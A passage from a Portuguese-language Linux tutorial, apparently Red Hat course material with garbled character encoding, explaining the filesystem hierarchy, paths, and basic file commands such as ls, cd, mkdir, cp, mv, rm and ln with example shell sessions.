Dados de tempo de execu√ß√£o de processos iniciados desde o √∫ltimo boot. Isso inclui arquivos de ID de processos e arquivos de bloqueio, entre outros. O conte√∫do desse diret√≥rio √© recriado na reinicializa√ß√£o. Este diret√≥rio consolida /var/run e /var/lock de vers√µes anteriores do Red Hat Enterprise Linux. /home
Diret√≥rios pessoais s√£o os locais onde os usu√°rios normais armazenam seus dados pessoais e arquivos de configura√ß√£o. /root
Diret√≥rio pessoal do superusu√°rio administrativo, root. /tmp
Um espa√ßo grav√°vel para arquivos tempor√°rios. Arquivos n√£o acessados, alterados nem modificados por 10 dias s√£o exclu√≠dos automaticamente desse diret√≥rio. H√° outro diret√≥rio tempor√°rio, /var/tmp, no qual os arquivos que n√£o tiverem sido acessados, alterados ou modificados por mais de 30 dias ser√£o exclu√≠dos automaticamente. /boot
Arquivos necess√°rios para come√ßar o processo de boot. /dev
Cont√©m arquivos de dispositivos especiais que s√£o usados pelo sistema para acessar o hardware. Importante No Red Hat Enterprise Linux 7 e posteriores, quatro diret√≥rios mais antigos em / t√™m o mesmo conte√∫do de suas contrapartes localizadas em /usr:
/bin e /usr/bin
/sbin e /usr/sbin
/lib e /usr/lib
/lib64 e /usr/lib64
Em vers√µes anteriores do Red Hat Enterprise Linux, esses diret√≥rios eram diferentes e continham conjuntos distintos de arquivos.
No Red Hat Enterprise Linux 7 e posteriores, os diret√≥rios em / s√£o links simb√≥licos para as pastas correspondentes em /usr.
Especifica√ß√£o de arquivos por nome A visualiza√ß√£o do navegador de arquivos comum (√† esquerda) √© equivalente √† visualiza√ß√£o descendente (√† direita).
O caminho de um arquivo ou diret√≥rio especifica o local exclusivo no sistema de arquivos. Seguir o caminho de um arquivo atravessa um ou mais subdiret√≥rios nomeados, delimitados por uma barra (/), at√© chegar ao destino. Os diret√≥rios, tamb√©m chamados de pastas, cont√™m outros arquivos e outros subdiret√≥rios. Eles podem ser referenciados da mesma maneira que os arquivos.
Importante Um caractere de espa√ßo √© aceit√°vel como parte de um nome de arquivo do Linux. No entanto, espa√ßos tamb√©m s√£o usados pelo shell para separar op√ß√µes e argumentos na linha de comando. Se voc√™ inserir um comando que inclua um arquivo que tenha um espa√ßo no nome, o shell poder√° interpretar erroneamente o comando e entender que voc√™ deseja iniciar um novo nome de arquivo ou outro argumento no espa√ßo.
√â poss√≠vel evitar isso colocando nomes de arquivos entre aspas. No entanto, se voc√™ n√£o precisar usar espa√ßos em nomes de arquivos, pode ser mais simples simplesmente evit√°-los.
=&amp;gt; Caminhos absolutos
Um caminho absoluto √© um nome totalmente qualificado, especificando a localiza√ß√£o exata dos arquivos na hierarquia do sistema de arquivos. Ele come√ßa no diret√≥rio raiz (/) e especifica cada subdiret√≥rio que deve ser percorrido para alcan√ßar o arquivo espec√≠fico. Cada arquivo em um sistema de arquivos tem um nome de caminho absoluto exclusivo, reconhecido por uma regra simples: um nome de arquivo com uma barra (/) como primeiro caractere √© um nome de caminho absoluto. Por exemplo, o nome de caminho absoluto do arquivo de log do sistema de mensagens √© /var/log/messages. Nomes de caminhos absolutos podem ser longos, por isso, os arquivos tamb√©m podem ser localizados em rela√ß√£o ao diret√≥rio de trabalho atual para o prompt do shell.
=&amp;gt; O diret√≥rio de trabalho atual e caminhos relativos
Quando um usu√°rio fizer login e abrir uma janela de comando, normalmente a localiza√ß√£o inicial ser√° o diret√≥rio pessoal do usu√°rio. Os processos do sistema tamb√©m t√™m um diret√≥rio inicial. Usu√°rios e processos navegam a outros diret√≥rios, conforme necess√°rio; os termos diret√≥rio de trabalho ou diret√≥rio de trabalho atual s√£o referentes ao local atual.
Assim como um caminho absoluto, um caminho relativo identifica um √∫nico arquivo, especificando somente o caminho necess√°rio para acessar o arquivo no diret√≥rio de trabalho local. O reconhecimento de nomes de caminho relativos segue uma regra simples: um nome de caminho com qualquer caractere diferente de uma barra como primeiro caractere √© um nome de caminho relativo. Um usu√°rio no diret√≥rio /var pode fazer refer√™ncia ao arquivo de log de mensagens de modo relativo como log/messages.
Sistemas de arquivos Linux, incluindo, entre outros, ext4, XFS, GFS2 e GlusterFS, diferenciam mai√∫sculas de min√∫sculas. A cria√ß√£o de FileCase.txt e filecase.txt no mesmo diret√≥rio resulta em dois arquivos exclusivos.
Sistemas de arquivos que n√£o s√£o do Linux podem funcionar de modo diferente. Por exemplo, o VFAT, o NTFS da Microsoft e o HFS&#43; da Apple, t√™m um comportamento de preserva√ß√£o de mai√∫sculas e min√∫sculas. Embora esses sistemas de arquivos n√£o diferenciem mai√∫sculas de min√∫sculas, eles exibem os nomes de arquivo com as letras originais usada durante a cria√ß√£o do arquivo. Portanto, se voc√™ tentou criar os arquivos no exemplo anterior em um sistema de arquivos VFAT, ambos os nomes seriam tratados como apontando para o mesmo arquivo em vez de dois arquivos diferentes.
Caminhos de navega√ß√£o
O comando pwd exibe o nome do caminho completo do diret√≥rio de trabalho atual para esse shell. Isso pode ajudar voc√™ a determinar a sintaxe para acessar arquivos usando nomes de caminho relativos. O comando ls lista o conte√∫do do diret√≥rio especificado ou, caso um diret√≥rio n√£o seja fornecido, do diret√≥rio de trabalho atual.
[user@host ~]$ pwd /home/user [user@host ~]$ ls Desktop Documents Downloads Music Pictures Public Templates Videos [user@host ~]$ Use o comando cd para alterar o diret√≥rio de trabalho atual do shell. Se voc√™ n√£o especificar nenhum argumento para o comando, ele ser√° alterado para o diret√≥rio pessoal.
No exemplo a seguir, uma mistura de caminhos absolutos e relativos √© usada com o comando cd para alterar o diret√≥rio de trabalho atual para o shell.
[user@host ~]$ pwd /home/user [user@host ~]$ cd Videos [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd /home/user/Documents [user@host Documents]$ pwd /home/user/Documents [user@host Documents]$ cd [user@host ~]$ pwd /home/user [user@host ~]$ Como voc√™ pode ver no exemplo anterior, o prompt de shell padr√£o tamb√©m exibe o √∫ltimo componente do caminho absoluto para o diret√≥rio de trabalho atual.
Por exemplo, para /home/user/Videos, somente Videos √© exibido. O prompt exibe o caractere til &amp;lsquo;~&amp;rsquo; quando o diret√≥rio de trabalho atual √© o diret√≥rio pessoa.
O comando touch normalmente atualiza o carimbo de data e hora de um arquivo para a data e a hora atuais, sem modific√°-lo. Isso √© √∫til para a cria√ß√£o de arquivos vazios, que podem ser usados para pr√°tica, pois o uso desse comando em um nome de arquivo que n√£o existe faz com que o arquivo seja criado. No exemplo a seguir, o comando touch cria arquivos de pr√°tica nos subdiret√≥rios Documents e Videos.
[user@host ~]$ touch Videos/blockbuster1.ogg [user@host ~]$ touch Videos/blockbuster2.ogg [user@host ~]$ touch Documents/thesis_chapter1.odf [user@host ~]$ touch Documents/thesis_chapter2.odf [user@host ~]$ O comando ls tem v√°rias op√ß√µes para a exibi√ß√£o de atributos nos arquivos. As mais comuns e √∫teis s√£o -l (formato de listagem longa), -a (todos os arquivos, incluindo os ocultos) e -R (recurs√£o, para incluir o conte√∫do de todos os subdiret√≥rios).
[user@host ~]$ ls -l total 15 drwxr-xr-x. 2 user user 4096 Feb 7 14:02 Desktop drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Documents drwxr-xr-x. 3 user user 4096 Jan 9 15:00 Downloads drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Music drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Pictures drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Public drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Templates drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Videos [user@host ~]$ ls -la total 15 drwx------. 16 user user 4096 Feb 8 16:15 . drwxr-xr-x. 6 root root 4096 Feb 8 16:13 .. -rw-------. 1 user user 22664 Feb 8 00:37 .bash_history -rw-r--r--. 1 user user 18 Jul 9 2013 .bash_logout -rw-r--r--. 1 user user 176 Jul 9 2013 .bash_profile -rw-r--r--. 1 user user 124 Jul 9 2013 .bashrc drwxr-xr-x. 4 user user 4096 Jan 20 14:02 .cache drwxr-xr-x. 8 user user 4096 Feb 5 11:45 .config drwxr-xr-x. 2 user user 4096 Feb 7 14:02 Desktop drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Documents drwxr-xr-x. 3 user user 4096 Jan 25 20:48 Downloads drwxr-xr-x. 11 user user 4096 Feb 6 13:07 .gnome2 drwx------. 2 user user 4096 Jan 20 14:02 .gnome2_private -rw-------. 1 user user 15190 Feb 8 09:49 .ICEauthority drwxr-xr-x. 3 user user 4096 Jan 9 15:00 .local drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Music drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Pictures drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Public drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Templates drwxr-xr-x. 2 user user 4096 Jan 9 15:00 Videos [user@host ~]$ Os dois diret√≥rios especiais no topo da lista se referem ao diret√≥rio atual (.) e ao diret√≥rio pai (..). Esses diret√≥rios especiais existem em todos os diret√≥rios do sistema. Voc√™ descobrir√° a utilidade deles quando come√ßar a usar comandos de gerenciamento de arquivos.
Importante Nomes de arquivos come√ßando com um ponto (.) indicam arquivos ocultos; n√£o √© poss√≠vel visualiz√°-los na exibi√ß√£o normal usando ls e outros comando. Esse n√£o √© um recurso de seguran√ßa. Os arquivos ocultos impedem que os arquivos de configura√ß√£o do usu√°rio necess√°rios sobrecarreguem diret√≥rios pessoais. Muitos comandos processam arquivos ocultos apenas com op√ß√µes de linha de comando especificas, evitando que a configura√ß√£o de um usu√°rio seja acidentalmente copiada para outros diret√≥rios ou usu√°rios.
Proteger o conte√∫do dos arquivos de visualiza√ß√µes inadequadas exige o uso de permiss√µes de arquivo.
[user@host ~]$ ls -R .: Desktop Documents Downloads Music Pictures Public Templates Videos ./Desktop: ./Documents: thesis_chapter1.odf thesis_chapter2.odf ./Downloads: ./Music: ./Pictures: ./Public: ./Templates: ./Videos: blockbuster1.ogg blockbuster2.ogg [user@host ~]$ O comando cd tem v√°rias op√ß√µes. Algumas s√£o t√£o √∫teis que √© importante pratic√°-las o mais cedo poss√≠vel e us√°-las com frequ√™ncia. O comando cd - passa para o diret√≥rio anterior, no qual o usu√°rio estava antes do diret√≥rio atual. O exemplo a seguir ilustra esse comportamento, alternando entre dois diret√≥rios, o que √© √∫til ao processar uma s√©rie de tarefas semelhantes.
[user@host ~]$ cd Videos [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd /home/user/Documents [user@host Documents]$ pwd /home/user/Documents [user@host Documents]$ cd - [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd - [user@host Documents]$ pwd /home/user/Documents [user@host Documents]$ cd - [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd [user@host ~]$ O comando cd .. usa o diret√≥rio oculto .. para subir um n√≠vel at√© o diret√≥rio pai sem precisar saber o nome exato desse diret√≥rio. O outro diret√≥rio oculto (.) especifica o diret√≥rio atual nos comandos em que a localiza√ß√£o atual √© o argumento de origem ou de destino, evitando a necessidade de digitar o nome de caminho absoluto do diret√≥rio.
[user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd . [user@host Videos]$ pwd /home/user/Videos [user@host Videos]$ cd .. [user@host ~]$ pwd /home/user [user@host ~]$ cd .. [user@host home]$ pwd /home [user@host home]$ cd .. [user@host /]$ pwd / [user@host /]$ cd [user@host ~]$ pwd /home/user [user@host ~]$ Gerenciamento de arquivos usando ferramentas de linha de comando Para gerenciar arquivos, voc√™ precisa ser capaz de criar, remover, copiar e mover os arquivos. Voc√™ tamb√©m precisa organiz√°-los logicamente em diret√≥rios, os quais voc√™ tamb√©m precisa ser capaz de criar, remover, copiar e mover.
A tabela a seguir resume alguns dos comandos mais comuns de gerenciamento de arquivos. O restante desta se√ß√£o discutir√° maneiras de usar esses comandos em mais detalhes.
Atividade =&amp;gt; Sintaxe do comando Criar um novo diret√≥rio =&amp;gt; mkdir directory Copiar um arquivo =&amp;gt; cp file new-file Copiar um diret√≥rio e seu conte√∫do =&amp;gt; cp -r directory new-directory Mover ou renomear um arquivo ou diret√≥rio =&amp;gt; mv file new-file Remover um arquivo =&amp;gt; rm file Remover um diret√≥rio contendo arquivos =&amp;gt; rm -r directory Remover um diret√≥rio vazio =&amp;gt; rmdir directory
Cria√ß√£o de diret√≥rios O comando mkdir cria um ou mais diret√≥rios ou subdiret√≥rios. Ele considera como argumentos uma lista de caminhos para os diret√≥rios que voc√™ deseja criar.
O comando mkdir falhar√° com um erro se o diret√≥rio j√° existir ou se voc√™ estiver tentando criar um subdiret√≥rio em um diret√≥rio que n√£o existe. A op√ß√£o -p (pai) cria diret√≥rios pais ausentes para o destino solicitado. Tenha cautela ao usar o comando mkdir -p pois erros de digita√ß√£o acidentais podem criar diret√≥rios n√£o pretendidos sem gerar mensagens de erro.
No exemplo a seguir, digamos que voc√™ est√° tentando criar um diret√≥rio no Videosdiret√≥rio nomeadoWatched, mas acidentalmente deixou a letra &amp;ldquo;s&amp;rdquo; em Videos no comando mkdir.
[user@host ~]$ mkdir Video/Watched mkdir: cannot create directory `Video/Watched&amp;#39;: No such file or directory O comando mkdir falhou porque Videos foi digitado incorretamente e o diret√≥rio Video n√£o existe. Se voc√™ tivesse usado o comando mkdir com a op√ß√£o -p, o diret√≥rio Video seria criado, o que n√£o era o pretendido, e o subdiret√≥rio Watched seria criado nesse diret√≥rio incorreto.
Depois de escrever corretamente o diret√≥rio pai Videos, a cria√ß√£o do subdiret√≥rio Watched ser√° bem-sucedida.
[user@host ~]$ mkdir Videos/Watched [user@host ~]$ ls -R Videos Videos/: blockbuster1.ogg blockbuster2.ogg Watched Videos/Watched: No exemplo a seguir, os arquivos e diret√≥rios s√£o organizados abaixo do diret√≥rio /home/user/Documents. Use o comando mkdir e uma lista de nomes de diret√≥rios separada por espa√ßos para criar v√°rios diret√≥rios.
[user@host ~]$ cd Documents [user@host Documents]$ mkdir ProjectX ProjectY [user@host Documents]$ ls ProjectX ProjectY Use o comando mkdir -p e caminhos relativos separados por espa√ßos para cada um dos nomes de subdiret√≥rios para criar v√°rios diret√≥rios pai com subdiret√≥rios.
[user@host Documents]$ mkdir -p Thesis/Chapter1 Thesis/Chapter2 Thesis/Chapter3 [user@host Documents]$ cd [user@host ~]$ ls -R Videos Documents Documents: ProjectX ProjectY Thesis Documents/ProjectX: Documents/ProjectY: Documents/Thesis: Chapter1 Chapter2 Chapter3 Documents/Thesis/Chapter1: Documents/Thesis/Chapter2: Documents/Thesis/Chapter3: Videos: blockbuster1.ogg blockbuster2.ogg Watched Videos/Watched: O √∫ltimo comando mkdir criou subdiret√≥rios de tr√™s subdiret√≥rios ChapterN com um comando. A op√ß√£o -p criou o diret√≥rio pai Thesis ausente.
C√≥pia de arquivos O comando cp copia um arquivo, criando um novo arquivo no diret√≥rio atual ou em um diret√≥rio especificado. Ele tamb√©m pode copiar v√°rios arquivos para um diret√≥rio.
Aten√ß√£o Se o arquivo de destino j√° existir, o comando cp substitui o arquivo.
[user@host ~]$ cd Videos [user@host Videos]$ cp blockbuster1.ogg blockbuster3.ogg [user@host Videos]$ ls -l total 0 -rw-rw-r--. 1 user user 0 Feb 8 16:23 blockbuster1.ogg -rw-rw-r--. 1 user user 0 Feb 8 16:24 blockbuster2.ogg -rw-rw-r--. 1 user user 0 Feb 8 16:34 blockbuster3.ogg drwxrwxr-x. 2 user user 4096 Feb 8 16:05 Watched [user@host Videos] Ao copiar v√°rios arquivos com um comando, o √∫ltimo argumento dever√° ser um diret√≥rio. Os arquivos copiados mant√™m seus nomes originais no novo diret√≥rio. Se um arquivo com o mesmo nome existir no diret√≥rio de destino, o arquivo existente ser√° substitu√≠do. Por padr√£o, o cp n√£o copia diret√≥rios, mas os ignora.
No exemplo a seguir, dois diret√≥rios s√£o listados, Thesis e ProjectX. Apenas o √∫ltimo argumento, ProjectX, √© v√°lido como destino. O diret√≥rio Thesis √© ignorado.
[user@host Videos]$ cd ../Documents [user@host Documents]$ cp thesis_chapter1.odf thesis_chapter2.odf Thesis ProjectX cp: omitting directory `Thesis&amp;#39; [user@host Documents]$ ls Thesis ProjectX ProjectX: thesis_chapter1.odf thesis_chapter2.odf Thesis: Chapter1 Chapter2 Chapter3 No primeiro comando cp, a c√≥pia do diret√≥rio Thesis falhou, mas os arquivos thesis_chapter1.odf e thesis_chapter2.odf foram copiados com √™xito.
Se voc√™ desejar copiar um arquivo para o diret√≥rio de trabalho atual, poder√° usar o diret√≥rio .:
[user@host ~]$ cp /etc/hostname . [user@host ~]$ cat hostname host.example.com [user@host ~]$ Use o comando copy com a op√ß√£o -r (recursiva) para copiar o diret√≥rio Thesis e seu conte√∫do para o diret√≥rio ProjectX.
[user@host Documents]$ cp -r Thesis ProjectX [user@host Documents]$ ls -R ProjectX ProjectX: Thesis thesis_chapter1.odf thesis_chapter2.odf ProjectX/Thesis: Chapter1 Chapter2 Chapter3 ProjectX/Thesis/Chapter1: ProjectX/Thesis/Chapter2: thesis_chapter2.odf ProjectX/Thesis/Chapter3: Movimenta√ß√£o de arquivos O comando mv move arquivos de um local para outro. Se voc√™ pensar no caminho absoluto para um arquivo como seu nome completo, mover um arquivo ser√° efetivamente o mesmo que renomear um arquivo. O conte√∫do do arquivo permanecer√° inalterado.
Use o comando mv para renomear um arquivo.
[user@host Videos]$ cd ../Documents [user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter1.odf -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2.odf [user@host Documents]$ mv thesis_chapter2.odf thesis_chapter2_reviewed.odf [user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter1.odf -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2_reviewed.odf Use o comando mv para mover um arquivo para outro diret√≥rio.
[user@host Documents]$ ls Thesis/Chapter1 [user@host Documents]$ [user@host Documents]$ mv thesis_chapter1.odf Thesis/Chapter1 [user@host Documents]$ ls Thesis/Chapter1 thesis_chapter1.odf [user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2_reviewed.odf Remo√ß√£o de arquivos e diret√≥rios O comando rm remove arquivos. Por padr√£o, rm n√£o remover√° diret√≥rios que contenham arquivos, a menos que voc√™ adicione as op√ß√µes -r ou &amp;ndash;recursive.
Importante N√£o existe um recurso de cancelamento de exclus√£o na linha de comando ou uma Lixeira da qual restaurar arquivos programados para exclus√£o.
√â uma boa ideia verificar seu diret√≥rio de trabalho atual antes de remover um arquivo ou diret√≥rio.
[user@host Documents]$ pwd /home/student/Documents Use o comando rm para remover um √∫nico arquivo do seu diret√≥rio de trabalho.
[user@host Documents]$ ls -l thesis* -rw-rw-r--. 1 user user 0 Feb 6 21:16 thesis_chapter2_reviewed.odf [user@host Documents]$ rm thesis_chapter2_reviewed.odf [user@host Documents]$ ls -l thesis* ls: cannot access &amp;#39;thesis*&amp;#39;: No such file or directory Se voc√™ tentar usar o comando rm para remover um diret√≥rio sem usar a op√ß√£o -r, o comando falhar√°.
[user@host Documents]$ rm Thesis/Chapter1 rm: cannot remove `Thesis/Chapter1&amp;#39;: Is a directory Use o comando rm -r para remover um subdiret√≥rio e seu conte√∫do.
[user@host Documents]$ ls -R Thesis Thesis/: Chapter1 Chapter2 Chapter3 Thesis/Chapter1: thesis_chapter1.odf Thesis/Chapter2: thesis_chapter2.odf Thesis/Chapter3: [user@host Documents]$ rm -r Thesis/Chapter1 [user@host Documents]$ ls -l Thesis total 8 drwxrwxr-x. 2 user user 4096 Feb 11 12:47 Chapter2 drwxrwxr-x. 2 user user 4096 Feb 11 12:48 Chapter3 O comando rm -r percorre cada subdiret√≥rio primeiro, removendo individualmente seus arquivos antes de remover cada diret√≥rio. Voc√™ pode usar o comando rm -ri para solicitar interativamente a confirma√ß√£o antes da exclus√£o. Isso √© essencialmente o oposto de usar a op√ß√£o -f, que for√ßa a remo√ß√£o sem solicitar a confirma√ß√£o do usu√°rio.
[user@host Documents]$ rm -ri Thesis rm: descend into directory `Thesis&amp;#39;? y rm: descend into directory `Thesis/Chapter2&amp;#39;? y rm: remove regular empty file `Thesis/Chapter2/thesis_chapter2.odf&amp;#39;? y rm: remove directory `Thesis/Chapter2&amp;#39;? y rm: remove directory `Thesis/Chapter3&amp;#39;? y rm: remove directory `Thesis&amp;#39;? y [user@host Documents]$ Aten√ß√£o Se voc√™ especificar as op√ß√µes -i e -f, a op√ß√£o -f tem prioridade e voc√™ n√£o ser√° solicitado para confirma√ß√£o antes que rm exclua arquivos.
No exemplo a seguir, o comando rmdir remove apenas o diret√≥rio que est√° vazio. Assim como no exemplo anterior, voc√™ deve usar o comando rm -r para remover um diret√≥rio que contenha conte√∫do.
[user@host Documents]$ pwd /home/student/Documents [user@host Documents]$ rmdir ProjectY [user@host Documents]$ rmdir ProjectX rmdir: failed to remove `ProjectX&amp;#39;: Directory not empty [user@host Documents]$ rm -r ProjectX [user@host Documents]$ ls -lR .: total 0 [user@host Documents]$ O comando rm sem op√ß√µes n√£o pode remover um diret√≥rio vazio. Voc√™ deve usar os comandos rmdir, rm -d (que √© equivalente a rmdir) ou rm -r.
Cria√ß√£o de links entre arquivos √â poss√≠vel criar v√°rios nomes que apontam para o mesmo arquivo. Existem duas maneiras de fazer isso: criando um link f√≠sico para o arquivo ou criando um link simb√≥lico (√†s vezes chamado de liga√ß√£o simb√≥lica) para o arquivo. Cada um tem suas vantagens e desvantagens.
Cria√ß√£o de links f√≠sicos Todo arquivo inicia com um √∫nico link f√≠sico, desde seu nome inicial at√© os dados no sistema de arquivos. Quando voc√™ cria um novo link f√≠sico para um arquivo, cria outro nome que aponta para os mesmos dados. O novo link f√≠sico age exatamente como o nome do arquivo original. Uma vez criado, voc√™ n√£o ver√° diferen√ßa entre o novo link f√≠sico e o nome original do arquivo.
Voc√™ pode descobrir se um arquivo tem v√°rios links f√≠sicos com o comando ls -l. Uma das coisas que ele relata √© a contagem de links de cada arquivo, o n√∫mero de links f√≠sicos que o arquivo possui.
[user@host ~]$ pwd /home/user [user@host ~]$ ls -l newfile.txt -rw-r--r--. 1 user user 0 Mar 11 19:19 newfile.txt No exemplo anterior, a contagem de links de newfile.txt √© 1. Ele tem exatamente um caminho absoluto, que √© /home/user/newfile.txt .
Voc√™ pode usar o comando ln para criar um novo link f√≠sico (outro nome) que aponte para um arquivo existente. O comando precisa de pelo menos dois argumentos, um caminho para o arquivo existente e o caminho para o link f√≠sico que voc√™ deseja criar.
O exemplo a seguir cria um link f√≠sico chamado newfile-link2.txt para o arquivo existente newfile.txt no diret√≥rio /tmp.
[user@host ~]$ ln newfile.txt /tmp/newfile-hlink2.txt [user@host ~]$ ls -l newfile.txt /tmp/newfile-hlink2.txt -rw-rw-r--. 2 user user 12 Mar 11 19:19 newfile.txt -rw-rw-r--. 2 user user 12 Mar 11 19:19 /tmp/newfile-hlink2.txt Se voc√™ desejar descobrir se dois arquivos s√£o links f√≠sicos um do outro, uma maneira √© usar a op√ß√£o -i com o comando ls para listar o n√∫mero de inode dos arquivos. Se os arquivos estiverem no mesmo sistema de arquivos (discutido a seguir) e seus n√∫meros de inode forem os mesmos, os arquivos s√£o links f√≠sicos apontando para os mesmos dados.
[user@host ~]$ ls -il newfile.txt /tmp/newfile-hlink2.txt 8924107 -rw-rw-r--. 2 user user 12 Mar 11 19:19 newfile.txt 8924107 -rw-rw-r--. 2 user user 12 Mar 11 19:19 /tmp/newfile-hlink2.txt Importante Todos os links f√≠sicos que fazem refer√™ncia ao mesmo arquivo ter√£o as mesmas permiss√µes, contagem de links, propriedade de usu√°rio e grupo, carimbos de data e hora e conte√∫do de arquivo. Se uma dessas informa√ß√µes for alterada em um link f√≠sico, todos os outros links f√≠sicos que apontem para o mesmo arquivo tamb√©m exibir√£o a nova informa√ß√£o. Isso ocorre porque cada link f√≠sico aponta para os mesmos dados no dispositivo de armazenamento.
Mesmo que o arquivo original seja exclu√≠do, o conte√∫do do arquivo ainda estar√° dispon√≠vel, desde que pelo menos um link f√≠sico exista. Os dados s√≥ s√£o exclu√≠dos do armazenamento quando o √∫ltimo link f√≠sico √© exclu√≠do.
[user@host ~]$ rm -f newfile.txt [user@host ~]$ ls -l /tmp/newfile-hlink2.txt -rw-rw-r--. 1 user user 12 Mar 11 19:19 /tmp/newfile-hlink2.txt [user@host ~]$ cat /tmp/newfile-hlink2.txt Hello World Limita√ß√µes de links f√≠sicos Os links f√≠sicos t√™m algumas limita√ß√µes. Em primeiro lugar, os links f√≠sicos s√≥ podem ser usados com arquivos regulares. Voc√™ n√£o pode usar ln para criar um link f√≠sico para um diret√≥rio ou arquivo especial.
Em segundo lugar, os links f√≠sicos s√≥ podem ser usados se ambos os arquivos estiverem no mesmo sistema de arquivos. A hierarquia do sistema de arquivos pode ser composta de v√°rios dispositivos de armazenamento. Dependendo da configura√ß√£o do sistema, quando voc√™ mudar para um novo diret√≥rio, esse diret√≥rio e seu conte√∫do poder√£o ser armazenados em um sistema de arquivos diferente.
Voc√™ pode usar o comando df para listar os diret√≥rios que est√£o em sistemas de arquivos diferentes. Por exemplo, voc√™ pode ver a sa√≠da desta maneira:
[user@host ~]$ df Filesystem 1K-blocks Used Available Use% Mounted on devtmpfs 886788 0 886788 0% /dev tmpfs 902108 0 902108 0% /dev/shm tmpfs 902108 8696 893412 1% /run tmpfs 902108 0 902108 0% /sys/fs/cgroup /dev/mapper/rhel_rhel8--root 10258432 1630460 8627972 16% / /dev/sda1 1038336 167128 871208 17% /boot tmpfs 180420 0 180420 0% /run/user/1000 [user@host ~]$ Arquivos em dois diret√≥rios &amp;ldquo;montados em&amp;rdquo; diferentes e seus subdiret√≥rios est√£o em sistemas de arquivos diferentes. (A correspond√™ncia mais espec√≠fica vence.) Assim, no sistema deste exemplo, voc√™ pode criar um link f√≠sico entre /var/tmp/link1 e /home/user/file porque ambos s√£o subdiret√≥rios de / mas n√£o de qualquer outro diret√≥rio na lista. No entanto, voc√™ n√£o pode criar um link f√≠sico entre /boot/test/badlink e /home/user/file porque o primeiro arquivo est√° em um subdiret√≥rio de /boot (na lista &amp;ldquo;montado em&amp;rdquo;) e o segundo arquivo n√£o.
Cria√ß√£o de softlinks O comando ln -s cria um softlink, tamb√©m chamado de &amp;ldquo;link simb√≥lico&amp;rdquo;. Um link simb√≥lico n√£o √© um arquivo normal, mas um tipo especial de arquivo que aponta para outro arquivo ou diret√≥rio existente.
Os links simb√≥licos t√™m algumas vantagens sobre links f√≠sicos:
=&amp;gt; Eles podem vincular dois arquivos em diferentes sistemas de arquivos.
=&amp;gt; Eles podem apontar para um diret√≥rio ou arquivo especial, n√£o apenas um arquivo comum.
No exemplo a seguir, o comando ln -s √© usado para criar um novo link flex√≠vel para o arquivo existente /home/user/newfile-link2.txt que ser√° nomeado /tmp/newfile-symlink.txt.
[user@host ~]$ ln -s /home/user/newfile-link2.txt /tmp/newfile-symlink.txt [user@host ~]$ ls -l newfile-link2.txt /tmp/newfile-symlink.txt -rw-rw-r--. 1 user user 12 Mar 11 19:19 newfile-link2.txt lrwxrwxrwx. 1 user user 11 Mar 11 20:59 /tmp/newfile-symlink.txt -&amp;gt; /home/user/newfile-link2.txt [user@host ~]$ cat /tmp/newfile-symlink.txt Soft Hello World No exemplo anterior, o primeiro caractere da listagem longa para /tmp/newfile-symlink.txt √© l, em vez de -. Isso indica que o arquivo √© um link simb√≥lico e n√£o um arquivo normal. (Um d indicaria que o arquivo √© um diret√≥rio.)
Quando o arquivo regular original √© exclu√≠do, o link simb√≥lico continua apontando para o arquivo, mas o destino some. Um link simb√≥lico que esteja apontando para um arquivo ausente √© denominado &amp;ldquo;link simb√≥lico pendente&amp;rdquo;.
[user@host ~]$ rm -f newfile-link2.txt [user@host ~]$ ls -l /tmp/newfile-symlink.txt lrwxrwxrwx. 1 user user 11 Mar 11 20:59 /tmp/newfile-symlink.txt -&amp;gt; /home/user/newfile-link2.txt [user@host ~]$ cat /tmp/newfile-symlink.txt cat: /tmp/newfile-symlink.txt: No such file or directory Importante
Um efeito colateral do link simb√≥lico pendente no exemplo anterior √© que, se voc√™ criar posteriormente um novo arquivo com o mesmo nome do arquivo exclu√≠do (/home/user/newfile-link2.txt), o link n√£o estar√° mais &amp;ldquo;pendurado&amp;rdquo; e apontar√° para o novo arquivo.
Os links f√≠sicos n√£o funcionam assim. Se voc√™ excluir um link f√≠sico e, em seguida, usar ferramentas normais ( ao inv√©s de ln) para criar um novo arquivo com o mesmo nome, o novo arquivo n√£o ser√° vinculado ao arquivo antigo.
Uma maneira de comparar links f√≠sicos e links simb√≥licos que pode ajudar voc√™ a entender como eles funcionam:
=&amp;gt; Um link f√≠sico aponta um nome para dados em um dispositivo de armazenamento
=&amp;gt; Um link simb√≥lico aponta um nome para outro nome, que aponta para dados em um dispositivo de armazenamento
Um link simb√≥lico pode apontar para um diret√≥rio. Nesse caso, o link simb√≥lico atuar√° como um diret√≥rio. Alterar para o link simb√≥lico com cd far√° com que o diret√≥rio de trabalho atual seja o diret√≥rio vinculado. Algumas ferramentas podem acompanhar o fato de voc√™ ter seguido um link simb√≥lico para chegar l√°. Por exemplo, por padr√£o cd atualizar√° seu diret√≥rio de trabalho atual usando o nome do link simb√≥lico, em vez do nome do diret√≥rio real. (Existe uma op√ß√£o, -P, que o atualizar√° com o nome do diret√≥rio real.)
No exemplo a seguir, um link simb√≥lico denominado /home/user/configfiles √© criado que aponta para o diret√≥rio /etc.
